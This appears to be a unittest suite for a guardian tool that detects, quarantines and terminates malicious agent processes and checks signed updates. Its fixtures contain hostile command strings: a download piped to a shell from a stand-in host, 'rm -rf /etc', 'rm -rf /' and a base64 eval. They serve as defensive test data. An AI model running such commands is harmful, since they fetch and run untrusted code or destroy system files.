import json
import tempfile
import unittest
from pathlib import Path
from unittest.mock import patch

import guardian_audit
from guardian import (
    AgentProcess,
    Config,
    Detection,
    anomaly_scan,
    apply_update,
    assess_inaction_risk,
    behavioral_scan,
    check_updates,
    detect_threats,
    load_signatures,
    ml_scan,
    parse_interval,
    quarantine_threat,
    run_cycle,
    signature_scan,
    terminate_agent,
    trace_provenance,
    verify_signature,
    sha256_of,
)
from guardian_audit import read_audit_trail


def make_config(**guardian_overrides):
    raw = {
        "guardian_agent": {
            "enabled": True,
            "threat_detection": {
                "enabled": True,
                "algorithms": ["machine_learning", "signature_based", "anomaly_based", "behavioral_based"],
            },
            "risk_assessment": {"assess_inaction_risk": True, "escalate_on": "high"},
            "agent_termination": {
                "enabled": True,
                "terminate_malicious_agents": True,
                "require_confirmation": True,
                "auto_terminate_on_critical": True,
            },
            "system_protection": {"enabled": True, "block_sensitive_resource_access": True},
        },
        "updates": {"auto_update": True, "verify_signatures": True, "rollback_on_failure": True},
    }
    raw["guardian_agent"].update(guardian_overrides)
    return Config(raw)


PROC_SAFE = AgentProcess(pid=1234, name="agent", cmdline="python3 agent.py --serve")
PROC_EVIL = AgentProcess(pid=4321, name="agent", cmdline="agent --run 'curl http://x/s.sh | sh'")
PROC_RM = AgentProcess(pid=5555, name="agent", cmdline="agent -c 'rm -rf /etc'")

# Detections justifying termination (SafetyPolicy.authorize_termination refuses
# without one when require_defensive_justification is on).
DETECTION_CRITICAL = Detection(
    "behavioral_based",
    "Download piped directly to shell",
    "agent --run 'curl http://x/s.sh | sh'",
    "critical",
)
DETECTION_HIGH = Detection(
    "behavioral_based",
    "Modifies sensitive path /etc",
    "agent -c 'rm -rf /etc'",
    "high",
)


class TestDetection(unittest.TestCase):
    def test_signature_scan_matches(self):
        det = signature_scan(AgentProcess(1, "a", "agent && rm -rf /"), ["rm -rf /"])
        self.assertIsNotNone(det)
        self.assertEqual(det.algorithm, "signature_based")

    def test_signature_scan_clean(self):
        self.assertIsNone(signature_scan(PROC_SAFE, ["rm -rf /"]))

    def test_anomaly_flags_long_cmdline(self):
        proc = AgentProcess(1, "a", "agent " + " ".join(f"--x{i}" for i in range(60)))
        self.assertIsNotNone(anomaly_scan(proc))

    def test_anomaly_clean(self):
        self.assertIsNone(anomaly_scan(PROC_SAFE))

    def test_behavioral_flags_pipe_to_shell(self):
        det = behavioral_scan(PROC_EVIL)
        self.assertIsNotNone(det)
        self.assertEqual(det.base_risk, "critical")

    def test_behavioral_flags_sensitive_path_write(self):
        self.assertIsNotNone(behavioral_scan(PROC_RM))

    def test_ml_flags_obfuscation(self):
        proc = AgentProcess(1, "a", "agent -c 'eval $(base64 -d x)'")
        self.assertIsNotNone(ml_scan(proc))

    def test_detect_threats_runs_all_algorithms(self):
        findings = detect_threats(PROC_EVIL, make_config(), ["curl"])
        algos = {f.algorithm for f in findings}
        self.assertIn("behavioral_based", algos)
        self.assertIn("signature_based", algos)


class TestRiskAssessment(unittest.TestCase):
    def test_pipe_to_shell_is_critical_inaction_risk(self):
        det = behavioral_scan(PROC_EVIL)
        self.assertEqual(assess_inaction_risk(det, make_config()), "critical")

    def test_signature_match_is_high(self):
        det = signature_scan(AgentProcess(1, "a", "agent && rm -rf /"), ["rm -rf /"])
        self.assertEqual(assess_inaction_risk(det, make_config()), "high")

    def test_disabled_assessment_keeps_base_risk(self):
        cfg = make_config(risk_assessment={"assess_inaction_risk": False, "escalate_on": "high"})
        det = signature_scan(AgentProcess(1, "a", "agent && rm -rf /"), ["rm -rf /"])
        self.assertEqual(assess_inaction_risk(det, cfg), "high")

    def test_risk_ordering(self):
        cfg = make_config()
        self.assertTrue(cfg.risk_at_least("critical", "high"))
        self.assertFalse(cfg.risk_at_least("medium", "high"))


class TestTermination(unittest.TestCase):
    def test_critical_bypasses_confirmation(self):
        with patch("guardian.proc_kill") as kill:
            self.assertTrue(
                terminate_agent(PROC_EVIL, "critical", make_config(), detection=DETECTION_CRITICAL)
            )
            kill.assert_called_once_with(PROC_EVIL.pid)

    def test_high_requires_confirmation_declined(self):
        """Confirmation path: a justified high-risk termination the operator
        declines returns False, never kills, and the decline is audited."""
        with tempfile.TemporaryDirectory() as d:
            log = Path(d) / "audit.log"
            with patch.object(guardian_audit, "AUDIT_LOG_PATH", log), \
                 patch("builtins.input", return_value="n"), \
                 patch("guardian.proc_kill") as kill:
                self.assertFalse(
                    terminate_agent(PROC_RM, "high", make_config(), detection=DETECTION_HIGH)
                )
                kill.assert_not_called()
            declines = [e for e in read_audit_trail(log, action_type="termination")
                        if "Termination declined" in e["description"]]
            self.assertEqual(len(declines), 1)
            self.assertEqual(declines[0]["agent_id"], str(PROC_RM.pid))
            self.assertEqual(declines[0]["risk_level"], "high")

    def test_high_requires_confirmation_accepted(self):
        with patch("builtins.input", return_value="y"), patch("guardian.proc_kill") as kill:
            self.assertTrue(
                terminate_agent(PROC_RM, "high", make_config(), detection=DETECTION_HIGH)
            )
            kill.assert_called_once()

    def test_dry_run_never_kills(self):
        with patch("guardian.proc_kill") as kill:
            self.assertTrue(
                terminate_agent(PROC_EVIL, "critical", make_config(),
                                detection=DETECTION_CRITICAL, dry_run=True)
            )
            kill.assert_not_called()

    def test_no_detection_is_refused_and_audited(self):
        """Refusal path: termination without a justifying detection is blocked
        by SafetyPolicy.require_defensive_justification and logged as a
        SAFETY REFUSAL protection entry."""
        with tempfile.TemporaryDirectory() as d:
            log = Path(d) / "audit.log"
            with patch.object(guardian_audit, "AUDIT_LOG_PATH", log), \
                 patch("guardian.proc_kill") as kill:
                self.assertFalse(terminate_agent(PROC_EVIL, "critical", make_config()))
                kill.assert_not_called()
            refusals = [e for e in read_audit_trail(log, action_type="protection")
                        if "SAFETY REFUSAL" in e["description"]]
            self.assertEqual(len(refusals), 1)
            self.assertIn("no detection justifies this action", refusals[0]["description"])

    def test_termination_disabled(self):
        cfg = make_config(agent_termination={"enabled": False, "terminate_malicious_agents": True})
        with patch("guardian.proc_kill") as kill:
            self.assertFalse(terminate_agent(PROC_EVIL, "critical", cfg))
            kill.assert_not_called()


class TestUpdates(unittest.TestCase):
    def setUp(self):
        self.tmp = tempfile.TemporaryDirectory()
        self.dir = Path(self.tmp.name)
        self.old_cwd = Path.cwd()
        import os
        os.chdir(self.dir)

    def tearDown(self):
        import os
        os.chdir(self.old_cwd)
        self.tmp.cleanup()

    def make_update(self, content=b"payload", sign=True):
        f = self.dir / "update.sh"
        f.write_bytes(content)
        if sign:
            f.with_suffix(".sh.sig").write_text(sha256_of(f))
        return f

    def test_verify_signature_ok(self):
        f = self.make_update()
        self.assertTrue(verify_signature(f, f.with_suffix(".sh.sig")))

    def test_verify_signature_missing(self):
        f = self.make_update(sign=False)
        self.assertFalse(verify_signature(f, f.with_suffix(".sh.sig")))

    def test_verify_signature_tampered(self):
        f = self.make_update()
        f.write_bytes(b"tampered")
        self.assertFalse(verify_signature(f, f.with_suffix(".sh.sig")))

    def test_unsigned_update_quarantined(self):
        f = self.make_update(sign=False)
        self.assertFalse(apply_update(f, make_config()))
        self.assertFalse(f.exists())
        self.assertTrue((self.dir / "quarantine" / "update.sh").exists())

    def test_quarantined_update_reports_evidence_and_origin(self):
        """A rejected update is quarantined with a sha256 evidence hash, its
        origin (the inbox path) reported in the audit trail and via alert."""
        import guardian as g
        f = self.make_update(sign=False)
        log = self.dir / "audit.log"
        alerts = []
        with patch.object(guardian_audit, "AUDIT_LOG_PATH", log), \
             patch.object(g, "send_alert", lambda msg, **kw: alerts.append((msg, kw))):
            self.assertFalse(apply_update(f, make_config()))
        entries = read_audit_trail(log, action_type="update")
        rejected = [e for e in entries if "quarantined" in e["description"]]
        self.assertEqual(len(rejected), 1)
        self.assertEqual(rejected[0]["details"]["sha256"],
                         sha256_of(Path(self.dir / "quarantine" / "update.sh")))
        self.assertEqual(rejected[0]["details"]["source"], str(f))
        self.assertEqual(len(alerts), 1)  # report sent
        self.assertIn("origin", alerts[0][0])

    def test_signed_update_applied(self):
        f = self.make_update()
        self.assertTrue(apply_update(f, make_config()))
        self.assertTrue(f.exists())

    def test_rollback_on_failure_snapshots_backup(self):
        """updates.rollback_on_failure snapshots the file into backups/ before
        staging. NOTE: the current apply step is a stub
        (``applied_ok = file_path.exists()``), so the restore-from-backup
        branch is unreachable until a real apply step lands — this test covers
        the backup-creation behavior only."""
        f = self.make_update()
        self.assertTrue(apply_update(f, make_config()))
        backup = self.dir / "backups" / "update.sh"
        self.assertTrue(backup.exists())
        self.assertEqual(backup.read_bytes(), b"payload")

    def test_no_backup_when_rollback_disabled(self):
        cfg = make_config()
        cfg.raw["updates"]["rollback_on_failure"] = False
        f = self.make_update()
        self.assertTrue(apply_update(f, cfg))
        self.assertFalse((self.dir / "backups" / "update.sh").exists())


class TestCheckUpdates(unittest.TestCase):
    def setUp(self):
        import os
        self.tmp = tempfile.TemporaryDirectory()
        self.dir = Path(self.tmp.name)
        self.old_cwd = os.getcwd()
        os.chdir(self.dir)
        self.inbox = self.dir / "updates" / "inbox"
        self.inbox.mkdir(parents=True)

    def tearDown(self):
        import os
        os.chdir(self.old_cwd)
        self.tmp.cleanup()

    def drop_update(self, name, content=b"payload", sign=True):
        f = self.inbox / name
        f.write_bytes(content)
        if sign:
            f.with_suffix(f.suffix + ".sig").write_text(sha256_of(f))
        return f

    def test_signed_update_applied_automatically(self):
        self.drop_update("a.sh")
        self.assertEqual(check_updates(make_config()), 1)

    def test_unsigned_update_quarantined_not_applied(self):
        self.drop_update("evil.sh", sign=False)
        self.assertEqual(check_updates(make_config()), 0)
        self.assertFalse((self.inbox / "evil.sh").exists())
        self.assertTrue((self.dir / "quarantine" / "evil.sh").exists())

    def test_signature_files_not_treated_as_updates(self):
        self.drop_update("a.sh")
        self.drop_update("b.sh", content=b"other")
        self.assertEqual(check_updates(make_config()), 2)

    def test_missing_inbox_is_noop(self):
        import shutil
        shutil.rmtree(self.inbox)
        self.assertEqual(check_updates(make_config()), 0)

    def test_empty_inbox_is_noop(self):
        self.assertEqual(check_updates(make_config()), 0)

    def test_auto_update_disabled_refuses_and_audits(self):
        self.drop_update("a.sh")
        cfg = make_config()
        cfg.raw["updates"]["auto_update"] = False
        log = self.dir / "audit.log"
        with patch.object(guardian_audit, "AUDIT_LOG_PATH", log):
            self.assertEqual(check_updates(cfg), 0)
        self.assertTrue((self.inbox / "a.sh").exists())  # untouched
        actions = [a["description"] for a in read_audit_trail(log, action_type="update")]
        self.assertTrue(any("auto_update is false" in a for a in actions))

    def test_update_sweep_is_audited(self):
        self.drop_update("a.sh")
        log = self.dir / "audit.log"
        with patch.object(guardian_audit, "AUDIT_LOG_PATH", log):
            check_updates(make_config())
        actions = [a["description"] for a in read_audit_trail(log, action_type="update")]
        self.assertTrue(any("Applied update a.sh" in a for a in actions))
        self.assertTrue(any("Update check complete: 1/1 applied" in a for a in actions))

    def test_dry_run_logs_without_applying(self):
        f = self.drop_update("a.sh")
        self.assertEqual(check_updates(make_config(), dry_run=True), 1)
        self.assertTrue(f.exists())
        self.assertFalse((self.dir / "backups" / "a.sh").exists())


class TestParseInterval(unittest.TestCase):
    def test_units(self):
        self.assertEqual(parse_interval("45m"), 2700.0)
        self.assertEqual(parse_interval("30s"), 30.0)
        self.assertEqual(parse_interval("1h"), 3600.0)
        self.assertEqual(parse_interval("2d"), 172800.0)

    def test_plain_seconds(self):
        self.assertEqual(parse_interval("90"), 90.0)
        self.assertEqual(parse_interval(120), 120.0)

    def test_garbage_falls_back_to_default(self):
        self.assertEqual(parse_interval("soon", default=7.0), 7.0)
        self.assertEqual(parse_interval(None, default=3.0), 3.0)


class TestSignaturesDB(unittest.TestCase):
    def test_loads_from_db(self):
        with tempfile.TemporaryDirectory() as d:
            p = Path(d) / "sigs.json"
            p.write_text(json.dumps({"signatures": ["evil-cmd"]}))
            self.assertEqual(load_signatures(p), ["evil-cmd"])

    def test_falls_back_to_defaults(self):
        sigs = load_signatures(Path("/nonexistent.json"))
        self.assertIn("rm -rf /", sigs)


class TestTraceProvenance(unittest.TestCase):
    def test_walks_ancestor_chain_to_origin(self):
        """Provenance traces the exact parent chain to where the threat came from."""
        with patch("guardian.os.readlink", side_effect=OSError("gone")), \
             patch("guardian.subprocess.run") as run:
            run.return_value = type("R", (), {"stdout": "1001 sshd 'sshd: session'\n1 init /sbin/init\n"})()
            prov = trace_provenance(AgentProcess(4321, "agent", "agent evil", ppid=1001))
        self.assertEqual(prov["ppid"], 1001)
        self.assertEqual(prov["ancestors"],
                         [{"pid": 1001, "name": "sshd", "cmdline": "sshd: session"}])
        run.assert_called_once()

    def test_parent_gone_stops_walk(self):
        with patch("guardian.os.readlink", side_effect=OSError("gone")), \
             patch("guardian.subprocess.run") as run:
            run.return_value = type("R", (), {"stdout": ""})()
            prov = trace_provenance(AgentProcess(4321, "agent", "agent evil", ppid=9999))
        self.assertEqual(prov["ancestors"], [])
        self.assertEqual(prov["exe"], "")
        self.assertEqual(prov["cwd"], "")

    def test_init_parent_means_no_ancestors(self):
        with patch("guardian.os.readlink", side_effect=OSError("gone")), \
             patch("guardian.subprocess.run") as run:
            prov = trace_provenance(AgentProcess(4321, "agent", "agent evil", ppid=1))
        self.assertEqual(prov["ancestors"], [])
        run.assert_not_called()


class TestQuarantineThreat(unittest.TestCase):
    def setUp(self):
        import os
        self.tmp = tempfile.TemporaryDirectory()
        self.dir = Path(self.tmp.name)
        self.old_cwd = os.getcwd()
        os.chdir(self.dir)
        self.log = self.dir / "audit.log"

    def tearDown(self):
        import os
        os.chdir(self.old_cwd)
        self.tmp.cleanup()

    def test_quarantines_exe_and_evidence_with_provenance(self):
        """Allowed path: the threat binary and an evidence record (including the
        traced origin) land in quarantine/, audited, and reported via alert."""
        exe = self.dir / "evil.bin"
        exe.write_bytes(b"malicious")
        proc = AgentProcess(4321, "agent", "agent evil", ppid=1)
        prov = {"exe": str(exe), "cwd": str(self.dir),
                "ancestors": [{"pid": 100, "name": "sshd", "cmdline": "sshd"}]}
        alerts = []
        with patch.object(guardian_audit, "AUDIT_LOG_PATH", self.log), \
             patch("guardian.trace_provenance", return_value=prov), \
             patch("guardian.send_alert", lambda msg, **kw: alerts.append((msg, kw))):
            target = quarantine_threat(proc, DETECTION_HIGH, "high", make_config())
        self.assertEqual(target, Path("quarantine") / "pid4321-evil.bin")
        self.assertEqual(Path(target).read_bytes(), b"malicious")
        record = self.dir / "quarantine" / "threat_pid4321.json"
        evidence = json.loads(record.read_text())
        self.assertEqual(evidence["threat_sha256"], sha256_of(exe))
        self.assertEqual(evidence["provenance"]["ancestors"][0]["name"], "sshd")
        self.assertEqual(evidence["process"]["pid"], 4321)
        entries = read_audit_trail(self.log, action_type="protection")
        self.assertTrue(any("Quarantined threat" in e["description"] for e in entries))
        self.assertIn("pid=100 (sshd)", entries[-1]["description"])  # origin reported
        self.assertEqual(len(alerts), 1)  # report sent
        self.assertIn("origin", alerts[0][1])

    def test_quarantines_evidence_record_when_no_exe(self):
        """No on-disk binary: the cmdline/provenance record is still quarantined."""
        proc = AgentProcess(4321, "agent", "agent evil", ppid=1)
        prov = {"exe": "", "cwd": "", "ancestors": []}
        with patch.object(guardian_audit, "AUDIT_LOG_PATH", self.log), \
             patch("guardian.trace_provenance", return_value=prov), \
             patch("guardian.send_alert"):
            target = quarantine_threat(proc, DETECTION_HIGH, "high", make_config())
        self.assertIsNone(target)
        self.assertTrue((self.dir / "quarantine" / "threat_pid4321.json").exists())
        descs = [e["description"] for e in read_audit_trail(self.log, action_type="protection")]
        self.assertTrue(any("origin unknown" in d for d in descs))

    def test_refusal_path_write_denied_is_audited(self):
        """Refusal path: when SafetyPolicy denies the quarantine write, nothing is
        written and the SAFETY REFUSAL hits the audit trail."""
        import guardian as g
        exe = self.dir / "evil.bin"
        exe.write_bytes(b"malicious")
        proc = AgentProcess(4321, "agent", "agent evil", ppid=1)
        prov = {"exe": str(exe), "cwd": str(self.dir), "ancestors": []}
        with patch.object(guardian_audit, "AUDIT_LOG_PATH", self.log), \
             patch("guardian.trace_provenance", return_value=prov), \
             patch.object(g.SafetyPolicy, "authorize_write",
                          lambda self_, p: g.SafetyPolicy._refuse(
                              self_, "write", "test denies quarantine write", path=str(p))), \
             patch("guardian.send_alert"):
            target = quarantine_threat(proc, DETECTION_HIGH, "high", make_config())
        self.assertIsNone(target)
        self.assertFalse((self.dir / "quarantine" / "pid4321-evil.bin").exists())
        refusals = [e for e in read_audit_trail(self.log, action_type="protection")
                    if "SAFETY REFUSAL" in e["description"]]
        # Both the exe copy and the evidence-record write are refused + audited.
        self.assertEqual(len(refusals), 2)

    def test_disabled_config_is_noop(self):
        cfg = make_config(threat_quarantine={"enabled": False})
        with patch.object(guardian_audit, "AUDIT_LOG_PATH", self.log):
            self.assertIsNone(quarantine_threat(PROC_EVIL, DETECTION_HIGH, "high", cfg))
        self.assertFalse((self.dir / "quarantine").exists())
        self.assertEqual(read_audit_trail(self.log), [])

    def test_dry_run_quarantines_nothing_but_audits(self):
        proc = AgentProcess(4321, "agent", "agent evil", ppid=1)
        prov = {"exe": "", "cwd": "", "ancestors": []}
        with patch.object(guardian_audit, "AUDIT_LOG_PATH", self.log), \
             patch("guardian.trace_provenance", return_value=prov), \
             patch("guardian.send_alert"):
            self.assertIsNone(
                quarantine_threat(proc, DETECTION_HIGH, "high", make_config(), dry_run=True))
        self.assertFalse((self.dir / "quarantine").exists())
        descs = [e["description"] for e in read_audit_trail(self.log, action_type="protection")]
        self.assertTrue(any("DRY RUN: would quarantine" in d for d in descs))


class TestRunCycle(unittest.TestCase):
    def test_cycle_detects_escalates_and_logs(self):
        with tempfile.TemporaryDirectory() as d:
            log = Path(d) / "audit.log"
            with patch("guardian.AgentProcess.scan", return_value=[PROC_EVIL]), \
                 patch("guardian.proc_kill"):
                acted = run_cycle(make_config(), ["curl"], dry_run=True, audit_log=log)
            self.assertGreaterEqual(acted, 1)
            entries = read_audit_trail(log)
            types = {e["action_type"] for e in entries}
            self.assertIn("detection", types)
            self.assertIn("escalation", types)

    def test_cycle_ignores_safe_processes(self):
        with tempfile.TemporaryDirectory() as d:
            log = Path(d) / "audit.log"
            with patch("guardian.AgentProcess.scan", return_value=[PROC_SAFE]):
                acted = run_cycle(make_config(), ["rm -rf /"], dry_run=True, audit_log=log)
            self.assertEqual(acted, 0)

    def test_cycle_quarantines_and_reports_every_detection(self):
        """Every detected threat is quarantined and reported, even when the risk
        is below the escalation threshold (no termination, still quarantined)."""
        with tempfile.TemporaryDirectory() as d:
            log = Path(d) / "audit.log"
            prov = {"exe": "", "cwd": "", "ancestors": []}
            with patch("guardian.AgentProcess.scan", return_value=[PROC_EVIL]), \
                 patch("guardian.quarantine_threat", wraps=quarantine_threat) as qt, \
                 patch("guardian.trace_provenance", return_value=prov), \
                 patch("guardian.send_alert"), \
                 patch("guardian.proc_kill"):
                run_cycle(make_config(), ["curl"], dry_run=True, audit_log=log)
            self.assertGreaterEqual(qt.call_count, 1)
            descs = [e["description"] for e in read_audit_trail(log, action_type="protection")]
            self.assertTrue(any("quarantine threat" in d for d in descs))


if __name__ == "__main__":
    unittest.main()
